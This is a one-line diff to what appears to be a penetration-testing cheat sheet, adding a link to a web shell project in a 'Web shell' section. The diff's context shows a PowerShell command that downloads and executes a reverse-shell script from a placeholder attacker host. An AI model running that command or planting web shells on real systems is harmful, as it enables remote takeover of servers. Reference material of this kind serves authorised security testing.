@@ -1040,6 +1040,7 @@ PowerShell "IEX(New-Object Net.WebClient).downloadString('http://IP_ATTACK/rev.p
 ## Web shell
 
 - *Highly recommendable to check [Tennc compilation](https://github.com/tennc/webshell)*
+- Also recomendable to see [phpbash](https://github.com/Arrexel/phpbash)
 
 - Create a `web_shell.php` file with this content:
 
